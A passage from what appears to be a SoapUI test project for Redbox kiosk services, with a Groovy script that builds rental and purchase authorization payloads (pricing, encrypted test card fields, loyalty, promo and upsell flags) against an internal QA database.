0.5%2C+%22TaxAmount%22+%3A+%220.049995%22%2C+%22GrandTotal%22+%3A+0.549995+%7D+%7D%7D%2C%22DiscountCode%22%3A+%22DVDONME%22%2C%22DiscountValue%22%3A+1%2C%22UseCredits%22%3A+%220%22%2C%22MessageId%22%3A+%22a5295620-1f59-41c0-92ec-e8565c653749%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22MessageType%22%3A+%22PreAuth%22%2C%22UseMessageControl%22%3A+false%7D</con:value></con:property><con:property><con:name>PromptRequired</con:name><con:value>false</con:value></con:property><con:property><con:name>AuthRuleId</con:name><con:value>0</con:value></con:property><con:property><con:name>AuthDays</con:name><con:value>0</con:value></con:property><con:property><con:name>AuthAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>SkipAuthRule</con:name><con:value>false</con:value></con:property><con:property><con:name>PreAuthSuccess</con:name><con:value>true</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>004721614</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Movies</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>DVD</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value>007880939,000150730,000150731</con:value></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value>Movies,Movies,Movies</con:value></con:property><con:property><con:name>PurchaseProductType</con:name><con:value>DVD,DigitalCode,DigitalCode</con:value></con:property><con:property><con:name>RentalCount</con:name><con:value>1</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>3</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Authorize" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="1ad2f728-4e1a-4bd9-9ce1-579653f68eff"><con:description/><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="69af8189-1695-40a7-af8b-4adfe6116847"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() As CurrentDate</con:query><con:assertion type="JDBC Status" id="5897a997-f0a8-4714-b2ed-24087b99e9b6" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (Authorize)" id="cb617466-53af-4e63-ab80-6a55e86bf951"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.####"); //Rounding the amount to 2 decimals.
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def epcConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('EPCSvc');
def constring = ConObj.getConnectionString();
def epcconstring = epcConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def epcsql = Sql.newInstance(epcconstring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");
ccPayload = ""
ccPayload += "\"CreditCard\": {";
ccPayload += "\"FirstName\": \"Redbox\",";
ccPayload += "\"LastName\": \"Server\",";
ccPayload += "\"Number\": \"$EncryptedNumber\",";
ccPayload += "\"PostalCode\": \"60181\",";
ccPayload += "\"ExpirationMonth\": \"12\",";
ccPayload += "\"ExpirationYear\": \"20\",";
ccPayload += "\"KeyId\": $KeyID,";
ccPayload += "\"CardId\": \"$CardID\",";
ccPayload += "\"LastFour\": \"$lastFour\",";
ccPayload += "\"CardType\": $CardType,";
ccPayload += "\"Track2\": \"$EncryptedTrack2\"";
ccPayload += "},";
testRunner.testCase.setPropertyValue("CCPayload", ccPayload);

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def uhdPrice = context.expand( '${#TestSuite#4KPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def uhdNonReturnDays = context.expand( '${#TestSuite#4KNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' );

//Service Fee
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}');
def serviceFeeTaxRate = context.expand( '${#TestCase#ServiceFeeTaxRate}');
def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}');

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def uhdNonreturnPrice = (uhdPrice.toBigDecimal() * uhdNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
//log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types; build the lists. 
//Rental
allBarcodes = [];
rentalBarcodes = [];
rentalTitleIds = [];
rentalProductFamily = [];
rentalProductType = [];
rentalDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
loyaltyProductId = [];
loyaltyProductPrice = [];
loyaltyPoints = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];
redemptionPoints = [];
discountedProductId = []; //For Assertions.
discountedProductPrice = []; //For Assertions.
blurayUpsellTypeId = [];
productGroupId = [];
discountAmountList = [];//PROMO List of Amounts for Loyalty and Promo Values 
//MNP
mnpTitleId = [];

//TSP
tspTitleId = [];

//MDV-Rental
rentalMDVFlag = [];
rentalMDVDiscNumber = [];

//Purchase
purchaseBarcodes = [];
purchaseProductFamily = [];
purchaseProductType = [];
purchaseDiscPrice = [];
purchaseTitleIds = [];
itemSourceType = [];

//MDV-Purchase
purchaseMDVFlag = [];
purchaseMDVDiscNumber = [];

//Payload building and Amount Calculations
//Rental Items Payload
rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
int rentalCount = 0;
//Purchase Items Payload
purchasePayload = "{\"GroupType\" : 2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
BigDecimal appliedPromoValue = 0;
int purchaseCount = 0;

//MNP
BigDecimal mnpAmount = 0;

//TSP
BigDecimal tspPromoAmount = 0;

BigDecimal SubTotal = 0;
BigDecimal DiscountedSubTotal = 0;
BigDecimal EstimatedLoyaltyAmount = 0;
BigDecimal TotalCartAmount = 0;//Total of Rental and Purchase Amount
BigDecimal remainingPromoValue = 0;

serviceFeePayload = ""; //ServiceFee Payload
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
requestPayload = ""; //Total payload rental + purchase + promo + loyalty

//Creating a Boolean
HasPhysicalPurchase = 'false';
testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);

//Get to-do Rental info
def numAddRentals = Eval.me("[" + context.expand( '${#TestCase#numOfRentals}' ) + "]");
def numAddPurchases = Eval.me("[" + context.expand( '${#TestCase#numOfPurchases}' ) + "]");
def PromoCode = context.expand( '${#TestCase#PromoCode}');
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
def mdvFlag = Eval.me("[" + context.expand( '${#TestCase#MDVFlag}' ) + "]" );
def mdvDiscNumber = Eval.me("[" + context.expand( '${#TestCase#MDVDiscNumber}' )+ "]" );

//MNP
def mnpFlag = context.expand( '${#TestCase#MNPFlag}' );

//TSP
def hasTSP = context.expand( '${#TestCase#HasTSP}' );
def tspFlag = context.expand( '${#TestCase#TSPFlag}' ); 
//Recommended Titles
def RCFlag = Eval.me("[" + context.expand( '${#TestCase#RCFlag}' ) + "]");
def hasOffer = context.expand( '${#TestCase#HasOffer}' )

//Rental & Purchase Format list
rentalformatIDList = rentalFormatIds.split(",");
purchaseformatIDList = purchaseFormatIds.split(",");

//Loyalty
loyaltyFlagList = loyaltyFlag.split(",");

//MNP
mnpFlagList = mnpFlag.split(",");
//Loyalty
int numberOfLoyaltyFlags = Eval.me("[" + loyaltyFlag + "]").count {it == 1};
//TSP
int numberOfTSPFlags = Eval.me("[" + tspFlag + "]").count {it == 1}; 
//Recommended Titles
int numberOfRCFlags = Eval.me("[" + RCFlag + "]").count {it == 1}; 
//MDV
int numberOfmdvFlags = mdvFlag.count {it == 1}; 
//log.info "numberOfmdvFlags: $numberOfmdvFlags | mdvFlag:$mdvFlag";
int numberOfmdvDiscNumber = Eval.me("[" + mdvDiscNumber + "]").count {it == 1}; 
Boolean hasMDV=false
if (numberOfmdvFlags > 0)
{
	hasMDV=true
	testRunner.testCase.setPropertyValue('hasMDV', hasMDV.toString());
}
else
{
	hasMDV=false
	testRunner.testCase.setPropertyValue('hasMDV', hasMDV.toString());
}

//TO-DO STILL THERE IS A FLAW IN THIS LOGIC. NEED TO FIGURE OUT THE SOLUTION.
//Purpose: If datasource says rent Dvd, Bluray and provide quantity for only Dvd and not for Bluray; currently it fail with array out of bound error.
//For Rentals
if (rentalformatIDList.size() != numAddRentals.size())
{
    def difference = (rentalformatIDList.size() - numAddRentals.size())
     for (di = 0; di < difference; di++)
     {
         numAddRentals.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else if (mnpFlagList.size() != numAddRentals.size())
{
     //nothing to do, code looks good
}
/*WRONG PLACE
//MNP
if (mnpFlagList.size() != numAddRentals.size())
{
     def difference = (Integer.valueOf(numAddRentals) - mnpFlagList.size())
     log.info ("difference: $difference")
     for (di = 0; di < difference; di++)
     {
         mnpFlagList.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
     
}
*/
//For Purchases
if (purchaseformatIDList.size() != numAddPurchases.size())
{
    def difference = (purchaseformatIDList.size() - numAddPurchases.size())
     for (di = 0; di < difference; di++)
     {
         numAddPurchases.add('1') //if the size is different add the default to 1
     }
}
else
{
     //nothing to do, code looks good
}
int totalCartCount = 0;
//Get CartSize
if (rentalFormatIds != '' && purchaseFormatIds != '')
{
	log.info ("Has both rental and purchases");
	totalCartCount += (numAddRentals.sum()) + (numAddPurchases.sum())
}
else if (rentalFormatIds == '' && purchaseFormatIds != '')
{
	log.info ("Has purchases");
	totalCartCount +=  (numAddPurchases.sum())
}
else if (rentalFormatIds != '' && purchaseFormatIds == '')
{
	log.info ("Has rental");
	totalCartCount +=  (numAddRentals.sum())
}
else
{
	log.info("I shouldnt be here");
}

if (mdvFlag.size() < totalCartCount)
{
	//Set the MDV to 0 
	for (mdv = 0; mdv < totalCartCount; mdv++)
     {
         //if the size is different add the default to 1
         mdvFlag.add('0');
     }
	if (numberOfmdvDiscNumber != totalCartCount)
	{
		for (d = 0; d < totalCartCount; d++)
	     {
	         //if the size is different add the default to 1
	         mdvDiscNumber.add('null');
	     }
	}
}

//Set OfferCode Data
if (hasOffer == 'false')
{
	//Set the RCFlag to 0 so that OfferCode is set to NULL.
	for (rc = 0; rc < totalCartCount; rc++)
     {
         //if the size is different add the default to 1
         RCFlag.add('0');
     }
}
else
{
	//Just to make sure that we have RCFlag for all the discs
	if (RCFlag.size() != totalCartCount)
	{
	    def difference = (totalCartCount - RCFlag.size())
	     for (di = 0; di < difference; di++)
	     {
	         RCFlag.add('0') //if the size is different add the default to 0
	     }
	}
	else
	{
	     //nothing to do, code looks good
	}
}

//Setting the RCFlags
//Saving the flag for Reconcile.
testRunner.testCase.setPropertyValue("RCFlag",RCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));

if (rentalFormatIds != '')
{
	rentalCartCount = numAddRentals.sum()
	rentalRCFlag = RCFlag.take(rentalCartCount)
	remainingRCFlag = RCFlag.drop(rentalCartCount)

	testRunner.testCase.setPropertyValue("rentalRCFlag",rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
	testRunner.testCase.setPropertyValue("purchaseRCFlag",remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
}
else
{
	rentalCartCount = numAddPurchases.sum()
	remainingRCFlag = RCFlag.take(rentalCartCount)
	rentalRCFlag = RCFlag.drop(rentalCartCount)
	
	testRunner.testCase.setPropertyValue("rentalRCFlag",rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
	testRunner.testCase.setPropertyValue("purchaseRCFlag",remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
}

//MDV
mdvFlagList = mdvFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
mdvDiscNumberList = mdvDiscNumber.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//log.info ("mdvFlagList:$mdvFlagList; mdvDiscNumberList:$mdvDiscNumberList");

//Prepare the final list
numAddRentalsList = numAddRentals.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
numAddPurchasesList = numAddPurchases.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

log.info ("numAddRentalsList: $numAddRentalsList; rentalformatIDList: $rentalformatIDList");
log.info ("numAddPurchasesList: $numAddPurchasesList; purchaseformatIDList: $purchaseformatIDList");
if ((rentalFormatIds == '0') || (rentalFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
	testRunner.testCase.setPropertyValue("HasPromoDiscount","0");
	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    //MDV
	    curformatID = rentalformatIDList[r].toString().trim();
	    curmdvFlag = mdvFlagList[r].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    //Skip below formats for MDV since there are no Titles
	    def skipMDV = ["1","2","19"] //DVD,Blu-ray, DigitalCode
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //getDisctc.setPropertyValue('IsMDV',curmdvFlag);  //MDV
	    if (curformatID in skipMDV)
	    {
	    		getDisctc.setPropertyValue('IsMDV','0');
	    }
	    else
	    {
	    		getDisctc.setPropertyValue('IsMDV',curmdvFlag);
	    }
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}	
	//Upsell coding logic
	def upsellOffer = context.expand( '${#TestCase#UpsellOffer}' );
	def upsellOfferStatus = context.expand( '${#TestCase#UpsellOfferStatus}' );
	upsellOfferList = upsellOffer.split(",");
	upsellOfferStatusList = upsellOfferStatus.split(",");
	
	//Offer Code	
	offerCodeList = rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	
	//Will Grab one format a time to build the request.	
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    def HasUpsell = context.expand( '${#TestCase#HasUpsell}' );
	    if (HasUpsell == 'true')
	    {
	    	//Upsell Logic
		curUpsellOffer = upsellOfferList[f].toString().trim();
		curUpsellOfferStatus = upsellOfferStatusList[f].toString().trim();
	    }
	    else
	    {
	    	curUpsellOffer = '0' 
	    }
	    
	    curformatID = rentalformatIDList[f].toString().trim(); 	    
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    //log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	


	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        curOfferCode = offerCodeList[b].toString().trim();

	        //MDV
		   curmdvFlag = mdvFlagList[b].toString().trim();
		   curmdvDiscNumber = mdvDiscNumberList[b].toString().trim();
	        
       	   //curmnpFlag = mnpFlagList[b].toString().trim();
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"VendStatus\" : 28," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
		
	        def skipFormats = ["DVD","Blu-ray","DigitalCode"]
	        //MDV
	        if (FormatName in skipFormats)
	        {
	        	rentalPayload += "\"MultiDisc\" : false,"
	        	rentalPayload += "\"DiscNumber\" : null,"
			
			rentalMDVFlag.add('false');
			rentalMDVDiscNumber.add('null');	        	
	        }
	        else
	        {
			rentalPayload += "\"MultiDisc\" : true,"
	        	rentalPayload += "\"DiscNumber\" : $curmdvDiscNumber,"

			rentalMDVFlag.add('true');
			rentalMDVDiscNumber.add(curmdvDiscNumber);
	        }
	        //EARLY-ID / OfferCode
	        if (curOfferCode == '1')
	        {
	        	rentalPayload += "\"OfferCode\" : \"RC\","
	        }
	        else
	        {
	        	rentalPayload += "\"OfferCode\" : null,"
	        }
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 0,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $dvdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $dvdPrice"

			//For Upsell 
			upsellTypeId = 1;
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalDiscPrice.add(dvdPrice);
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
			redemptionPoints.add('1500');
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $blurayPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $blurayPrice"
			
			//For Upsell 
			upsellTypeId = 1;
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
			redemptionPoints.add('1750')
	        }
	        else if (curformatID == '19') //For 4K
	        {
			rentalPayload += "\"InitialNight\" : $uhdPrice,"
			rentalPayload += "\"ExtraNight\" : $uhdPrice,"
			rentalPayload += "\"NonReturn\" : $uhdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $uhdPrice,"
			rentalPayload += "\"NonReturnDays\" : $uhdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $uhdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $uhdPrice"
			
			//For Upsell 
			upsellTypeId = 3;
			//Calculate Rental Total
			rentalTotal += (uhdPrice.toBigDecimal());
			rentalDiscPrice.add(uhdPrice);
			rentalNonReturnPrice.add(uhdNonreturnPrice); 
			rentalNonReturnDays.add(uhdNonReturnDays);
			redemptionPoints.add('2000')
	        }
	        else //For Games
	        {
			if (curmdvFlag == '1' && curmdvDiscNumber != '1')
			{
				updatedGameprice = '0';
				updatedgameNonreturnPrice = '0'
			}
			else
			{
				updatedGameprice = gamePrice;
				updatedgameNonreturnPrice = gameNonreturnPrice;
			}
						
			rentalPayload += "\"InitialNight\" : $updatedGameprice,"
			rentalPayload += "\"ExtraNight\" : $updatedGameprice,"
			rentalPayload += "\"NonReturn\" : $updatedgameNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $updatedGameprice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $updatedGameprice,"
			rentalPayload += "\"DefaultExtraNight\" : $updatedGameprice"
			
			//For Upsell 
			upsellTypeId = 1;

			//Calculate Rental Total
			rentalTotal += (updatedGameprice.toBigDecimal());
			rentalDiscPrice.add(updatedGameprice);
			rentalNonReturnPrice.add(updatedgameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
			redemptionPoints.add('2500');
	        }	
			rentalPayload += "}," 
			if (curUpsellOffer == '1')
			{
				def getProductGroupInfo = epcsql.firstRow("Select ProductGroupId from ProductGroupXREF Where ProductId in (Select ProductId from Product Where ProductNumber =$curTitleID)");
				def curproductGroupId = getProductGroupInfo.ProductGroupId.toString();
				rentalPayload += "\"BlurayUpsell\" : {"
				rentalPayload += "\"ProductGroupId\" : $curproductGroupId,"
				rentalPayload += "\"Offer\" : \"$curUpsellOfferStatus\","
				rentalPayload += "\"TitleId\" : $curTitleID,"
				rentalPayload += "\"TypeId\" : $upsellTypeId"
				rentalPayload += "},"
				productGroupId.add(curproductGroupId);
			}
			else
			{
				rentalPayload += "\"BlurayUpsell\" : null,"
				productGroupId.add(0)
			}
			rentalPayload += "\"ItemSourceType\" : 3"
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			allBarcodes.add(curBarcodeID);
			testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString()); 
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			blurayUpsellTypeId.add(upsellTypeId);
			itemSourceType.add(0);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
    	    testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	    testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());
	    testRunner.testCase.setPropertyValue('RedemptionPoints', redemptionPoints.join(",").toString());
	    testRunner.testCase.setPropertyValue('UpsellTypeId', blurayUpsellTypeId.join(",").toString()); 
	    testRunner.testCase.setPropertyValue('ProductGroupId', productGroupId.join(",").toString()); 
	    testRunner.testCase.setPropertyValue('ItemSourceType', itemSourceType.join(",").toString());
	    //MDV
	    testRunner.testCase.setPropertyValue('RentalMDVFlag', rentalMDVFlag.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalMDVDiscNumber', rentalMDVDiscNumber.join(",").toString());
	    
	}
	log.info ("rentalTitleIds: $rentalTitleIds; rentalDiscPrice:$rentalDiscPrice; redemptionPoints:$redemptionPoints");
	testRunner.testCase.setPropertyValue("DiscountTitleIds",rentalTitleIds.join(",").toString())
	testRunner.testCase.setPropertyValue("DiscountProductPrices",rentalDiscPrice.join(",").toString())
	//Build loyalty payload.
	if (loyaltyFlag == "")
	{
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	}
	else
	{
		loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		for (l = 0; l < numberOfLoyaltyFlags; l++)
		{
		    	def DiscountTitleIds = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]");
		    	def DiscountProductPrices = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]");
		    	def redemptionPointsList = Eval.me("[" + context.expand( '${#TestCase#RedemptionPoints}' ) + "]");
		    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
		    	curLoyaltyTitle = DiscountTitleIds.take(1).toString().replace("[", "").replace("]", "");
			curLoyaltyPrice = DiscountProductPrices.take(1).toString().replace("[", "").replace("]", "");
			curredemptionPoints = redemptionPointsList.take(1).toString().replace("[", "").replace("]", "");
